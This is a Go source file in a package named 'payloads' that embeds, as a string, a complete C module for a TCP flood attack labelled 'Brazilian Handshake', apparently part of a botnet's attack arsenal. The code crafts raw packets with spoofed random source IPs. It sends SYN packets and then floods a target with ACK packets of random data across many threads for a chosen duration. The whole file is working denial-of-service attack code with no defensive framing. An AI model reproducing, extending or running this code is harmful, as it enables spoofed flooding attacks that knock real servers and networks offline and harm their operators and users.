package payloads

var TCPBrazilianHandshake = `
// ==================== TCP BRAZILIAN HANDSHAKE FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

static int brazilian_running = 0;
static pthread_t brazilian_threads[100];

unsigned short csum_br(unsigned short *buf, int count) {
    register unsigned long sum = 0;
    while (count > 1) { sum += *buf++; count -= 2; }
    if (count > 0) sum += *(unsigned char *)buf;
    while (sum >> 16) sum = (sum & 0xffff) + (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short tcpcsum_br(struct iphdr *iph, struct tcphdr *tcph, int psize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + psize);
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + psize;
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + psize);
    unsigned short output = csum_br(tcp, totaltcp_len);
    free(tcp);
    return output;
}

int tcp_handshake_br(int port, int sock, uint32_t dst_ip, uint32_t src_ip, uint32_t seq) {
    char packet[128];
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htons(rand() & 0xFFFF);
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = src_ip;
    iph->daddr = dst_ip;
    
    tcph->source = htons(rand() & 0xFFFF);
    tcph->dest = htons(port);
    tcph->seq = htonl(seq);
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(64240);
    
    iph->check = csum_br((unsigned short *)iph, sizeof(struct iphdr));
    tcph->check = tcpcsum_br(iph, tcph, 0);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = dst_ip;
    
    return sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
}

void *brazilian_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    int length = *(int *)((char *)arg + 72);
    
    char datagram[1510];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    char *data = (char *)(tcph + 1);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (fd < 0) return NULL;
    
    int tmp = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp));
    
    struct sockaddr_in cliaddr;
    cliaddr.sin_family = AF_INET;
    cliaddr.sin_addr.s_addr = htonl(INADDR_ANY);
    cliaddr.sin_port = htons(rand() & 0xFFFF);
    
    int sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
    bind(sock, (struct sockaddr *)&cliaddr, sizeof(cliaddr));
    
    for (int x = 0; x < 5; x++) {
        tcp_handshake_br(port, fd, sin.sin_addr.s_addr, rand(), rand());
        usleep(100000);
    }
    close(sock);
    
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + length);
    iph->id = htons(rand() & 0xFFFF);
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = rand();
    iph->daddr = sin.sin_addr.s_addr;
    
    tcph->source = htons(rand() & 0xFFFF);
    tcph->dest = htons(port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = htonl(rand());
    tcph->doff = 5;
    tcph->ack = 1;
    tcph->window = htons(rand() & 0xFFFF);
    
    time_t start = time(NULL);
    
    while (brazilian_running && time(NULL) - start < duration) {
        for (int i = 0; i < length; i++) data[i] = rand() % 256;
        iph->saddr = rand();
        iph->id = htons(rand() & 0xFFFF);
        iph->check = 0;
        iph->check = csum_br((unsigned short *)iph, sizeof(struct iphdr));
        tcph->source = htons(rand() & 0xFFFF);
        tcph->seq = htonl(rand());
        tcph->check = 0;
        tcph->check = tcpcsum_br(iph, tcph, length);
        sendto(fd, datagram, ntohs(iph->tot_len), 0, (struct sockaddr *)&sin, sizeof(sin));
        usleep(1000);
    }
    
    close(fd);
    return NULL;
}

void start_brazilian_attack(char *target, int port, int threads, int duration_sec, int length) {
    if (brazilian_running) return;
    brazilian_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    *((int *)(arg + 72)) = length;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&brazilian_threads[i], NULL, brazilian_flood, arg);
    }
    
    sleep(duration_sec);
    brazilian_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(brazilian_threads[i], NULL);
    }
    free(arg);
}

void stop_brazilian_attack() { brazilian_running = 0; }
// ==================== END BRAZILIAN HANDSHAKE MODULE ====================
`